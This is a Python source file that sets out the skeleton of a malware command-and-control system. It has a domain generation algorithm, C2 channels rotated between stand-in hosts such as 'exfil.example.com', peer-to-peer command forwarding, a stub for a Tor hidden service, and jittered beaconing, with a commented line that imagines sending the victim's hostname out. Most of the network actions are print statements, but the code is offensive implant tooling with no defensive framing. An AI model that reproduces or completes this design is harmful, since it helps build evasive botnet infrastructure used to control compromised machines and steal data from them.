import os
import hashlib
import random
import threading
import time
from datetime import datetime, timezone


class DGAEngine:
    @staticmethod
    def generate_domain(seed_date=None):
        seed = int(seed_date.strftime("%Y%m%d")) if seed_date else int(time.time())
        random.seed(seed)
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
        return f"{name}.com"


class PhantomProtocol:
    def __init__(self):
        self.c2_channels = {"https": "c2.example.com", "dns": "exfil.example.com"}
        self.active = random.choice(list(self.c2_channels.keys()))
        self.peers = ["10.0.0.5", "10.0.0.6"]
        self.timer = None
        self.running = True
        self._start_rotation()

    def _start_rotation(self):
        if self.running:
            self.timer = threading.Timer(600, self._rotate_channel)
            self.timer.start()

    def _rotate_channel(self):
        if not self.running:
            return
        choices = list(self.c2_channels.keys())
        choices.remove(self.active)
        self.active = random.choice(choices)
        print(f"[C2] Switched active channel to {self.active}")
        self._start_rotation()

    def p2p_forward(self, command: str):
        peer = random.choice(self.peers)
        print(f"[C2/P2P] Forwarding '{command}' to peer {peer}")

    def stop(self):
        self.running = False
        if self.timer:
            self.timer.cancel()
            self.timer = None


class TorC2:
    @staticmethod
    def hidden_service():
        print("[TOR] Beaconing via .onion hidden service")

    @staticmethod
    def check_relay():
        fp = hashlib.sha1(os.urandom(16)).hexdigest()
        print(f"[TOR] Relay fingerprint: {fp}")


class CallbackProtocol:
    def __init__(self, interval=60, jitter=0.2, c2=None):
        self.interval = interval
        self.jitter = jitter
        self.c2 = c2 or PhantomProtocol()
        self.timer = None
        self.running = False

    def start(self):
        self.running = True
        self._schedule()

    def _schedule(self):
        if not self.running:
            return
        delay = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
        self.timer = threading.Timer(delay, self._beacon)
        self.timer.start()

    def _beacon(self):
        if not self.running:
            return
        now = datetime.now(timezone.utc).isoformat()
        channel = self.c2.active
        print(f"[CALLBACK] {now} – Beaconing over {channel}")
        # Imagine sending: self.c2.send({"host": platform.node(), "time": now})
        self._schedule()

    def stop(self):
        self.running = False
        if self.timer:
            self.timer.cancel()
            self.timer = None
